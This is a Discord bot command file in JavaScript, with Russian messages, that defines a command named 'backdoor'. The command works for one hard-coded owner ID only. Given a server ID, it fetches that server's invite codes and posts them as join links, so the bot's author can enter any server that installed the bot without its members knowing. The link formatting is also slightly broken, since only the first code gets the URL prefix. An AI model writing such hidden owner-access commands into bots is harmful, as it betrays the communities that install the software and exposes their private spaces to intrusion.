module.exports.run = async (bot, message, args) => {
	if(message.author.id != '317598066276565003') return message.channel.send('Ты не мой хозяин');
	const guild = bot.guilds.cache.get(args[0]);

	if (!guild) return message.reply('Бот не находится на сервере с указанным ID.');
	guild.fetchInvites()
		.then(invites => message.channel.send('Найдено приглашений:\n ' + 'https://discordapp.com/invite/' + invites.map(invite => invite.code).join('\n')))
		.catch(console.error);
};

module.exports.help = {
	name: 'backdoor',
	aliases: ['bdr']
};